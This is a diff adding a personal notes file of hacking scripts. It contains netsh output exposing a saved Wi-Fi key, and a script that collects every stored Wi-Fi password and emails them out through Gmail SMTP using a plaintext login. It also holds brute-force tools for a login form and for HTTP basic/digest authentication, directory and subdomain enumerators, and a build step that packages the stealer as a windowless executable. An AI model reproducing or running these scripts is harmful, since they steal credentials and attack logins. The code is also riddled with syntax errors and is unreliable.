@@ -1,0 +1,290 @@
+C:\Users\naray>netsh wlan show profile
+
+Profiles on interface Wi-Fi:
+
+Group policy profiles (read only)
+---------------------------------
+    <None>
+
+User profiles
+-------------
+    All User Profile     : Narayana2
+    All User Profile     : Narayan
+    All User Profile     : vivo 2020
+    All User Profile     : Redmi Prash
+    All User Profile     : AndroidAP
+    All User Profile     : iPhone
+    All User Profile     : Dummy
+    All User Profile     : Pranav
+
+
+C:\Users\naray>netsh wlan show profile Narayana2 key=clear
+
+Profile Narayana2 on interface Wi-Fi:
+=======================================================================
+
+Applied: All User Profile
+
+Profile information
+-------------------
+    Version                : 1
+    Type                   : Wireless LAN
+    Name                   : Narayana2
+    Control options        :
+        Connection mode    : Connect manually
+        Network broadcast  : Connect only if this network is broadcasting
+        AutoSwitch         : Do not switch to other networks
+        MAC Randomization  : Disabled
+
+Connectivity settings
+---------------------
+    Number of SSIDs        : 1
+    SSID name              : "Narayana2"
+    Network type           : Infrastructure
+    Radio type             : [ Any Radio Type ]
+    Vendor extension          : Not present
+
+Security settings
+-----------------
+    Authentication         : WPA2-Personal
+    Cipher                 : CCMP
+    Authentication         : WPA2-Personal
+    Cipher                 : GCMP
+    Security key           : Present
+    Key Content            : Emcj@202008
+
+Cost settings
+-------------
+    Cost                   : Unrestricted
+    Congested              : No
+    Approaching Data Limit : No
+    Over Data Limit        : No
+    Roaming                : No
+    Cost Source            : Default
+
+
+//https://pythex.org/     for regular expressions
+
+Python code for stealing WiFi password
+======================================
+#! /usr/bin/python
+
+import subprocess, smtplib re
+
+command1= "netsh wlan show profile"
+Networks=subprocess.check_output(command1,shell=True)
+network_list=re.findall('(?:Profile\s*:\s)(.*),Networks)
+
+final_output=""
+for network in network_list:
+	command2="netsh wlan show profile"+network+"key=clear"
+	one_network_result=subprocess.check_output(command2,shell=True)
+	final_output+=one_network_result
+
+server=smtpli.smpt("smtp.gmail.com",587)
+server.starttls()
+server.login("narayanshetty.sjce@gmail.com","Emcj@2017")
+server.sendmail("narayanshetty.sjce@gmail.com","narayanshetty.sjce@gmail.com",final_output)
+server.quit()
+
+====================================================
+python code for bruteforce application login
+===================================================
+#! /usr/bin/python
+
+import requests
+#from termcolor import colored
+
+def bruteforce(username,url):
+	for password in passwords:
+		password=password.strip()	
+		print("[+] Trying to Bruteforce with password --> " +password)
+		data_dictionary={"login":username,"password":password,"form":"submit"}
+		response=requests.post(url,data=data_dictionary)
+		if "Invalid credentials or user not activated!" in response.content:
+			pass
+		else:
+			#print(colored("-----User Logged in successfully---", 'green'))
+			#print(colored("[+] Username: -->"+username,'green'))
+			#print(colored("[+] Password : -->"+password,'green'))
+
+			print("-----User Logged in successfully---")
+			print("[+] Username: -->"+username)
+			print("[+] Password : -->"+password)
+
+			exit()
+
+page_url="http://192.168.220.160/bWAPP/login.php"
+username=raw_input("Enter username for specified page  ")
+
+with open("passwordList.txt","r") as passwords:
+	bruteforce(username,page_url)
+
+=====================================================
+code for Discover files and directories
+====================================================
+#! usr/bin/python
+import requests
+
+def request(url):
+	try:
+		return requests.get("http://"+url)
+	except reuests.exception.ConnectionError:
+		pass
+
+page_url=raw_input("Enter URL ")
+
+Ffile=open("common.txt","r")
+for line in file:
+	word=line.strip()
+	full_url=page_url+/+word
+	response=request(full_url)
+	if response:
+		print{" Discovered link: "+full_url)
+======================================================
+
+=====================================================
+code for Discover subdomains
+====================================================
+#! usr/bin/python
+import requests
+
+def request(url):
+	try:
+		return requests.get("http://"+url)
+	except: reuests.exception.ConnectionError:
+		pass
+
+page_url=raw_input("Enter URL ")
+page_url=raw_input("Enter FILE to use ")
+
+file=open("common.txt","r")
+for line in file:
+	word=line.strip()
+	full_url=word+"."+page_url
+	response=request(full_url)
+	if response:
+		print{" Discovered subdomains: "+full_url)
+======================================================
+code for send request with headers
+=====================================================
+#! usr/bin/python
+import requests
+
+my_headers={'host':windows 7}
+response=request.get('www.python.org/headers', headers=my_headers)
+
+print response.text
+
+=========================================================
+$! /usr/bin/python
+
+import requests
+from threading import Thread
+import sys
+import time
+import getopt
+from requests.auth import HTTPDigestAuth
+
+global hit
+hit="1"
+def banner():
+	print '''*****************************
+		BASE OF DIGEST BRUTEFORCE AUTH
+		******************************'''
+
+def sage():
+	print :usage: "
+	print"		-w: url (http://xyz.com)"
+	print"		-u: username"
+	print"		-t: threads"
+	print"		-f: dictionary file"
+	print"		-m: method (basic or digest)"
+	print"Example basicordigest.py -u http://xyz.com -u admin -f passwords.txt -t 5 -m method"
+	
+
+class request_performer(Thread):
+	def__init__(self,passwd,user,url,method):
+		Thread__init__(self)
+		self.password=passwd.split("\n")[0]
+		self.username=user
+		self.method=method
+		print "--"+self.password+"--"
+	if run(self):
+		global hit
+		if hit=="1":
+			try:
+				if self.method=="basic":
+					r=requests.get(self.url,auth=(self.username,self.passwordd))
+				elif self.method=="digest":
+					r=requests.get(self.url,auth=HTTPDigestAuth(self.username,self.passwordd))
+				if r.status_code==200:
+					hit="0"
+					print "[+] Password Founr-"+self.password
+				else:
+					print "[`] Invalid Password--"+self.password
+					i[0]=i[0]-1
+			except Exception,e:
+				print e
+
+def start(argv):
+	banner()
+	if len(sys.argv)<5:
+		usage()
+		sys.exit()
+	try:
+		opts,args=getopt.getopt(argv,"u:w:f:m:t")
+	except:getopt.GetoptError:
+		print "[!!] Error on Arguments!"
+		sys.exit()
+
+	method="basic"
+	for opt,arg in opts
+		if opt=='-u':
+			user=arg
+		elif opt=='-w':
+			url-arg
+		elif opt=='-f':
+			directory-arg
+		elif opt=='-m':
+			method-arg
+		elif opt=='-t':
+			threads-arg
+
+	try:
+		f=open(dictionary,'r')
+		passwords=f.readLines()
+	except:
+		print "[!!] File Does not Exists, Please check path"
+		sys.exit()
+	launcher_threads(passwords,threads,user,url,method):
+		global i
+		i={}
+		i.append(0)
+		while len(passwords):
+			if hit=='1'
+				try:
+					if i[0]<th:
+						passwd=passwords.pop(0)
+						i[0]=i[0]+1
+						thread=request_performer(passwd,username,url,method)
+						thread.start()
+				except: KeyboardInterrupt:
+					print "[!!] Interrupted"
+					sys.exit()
+				thread.join()
+
+if __name__=="__main__":
+	try:
+		start(sys.argv[1:])
+	except KeyboardInterrupt:
+		print" Interrupted"
+
+===================================================================
+
+wine /home/kali/.wine/drive_c/python27/python.exe -m pip install smtplib
+
+wine /home/kali/.wine/drive_c/Python27/Scripts/easy_install.exe --onefile --noconsole WiFiPassword.py
+
+======================================================
+
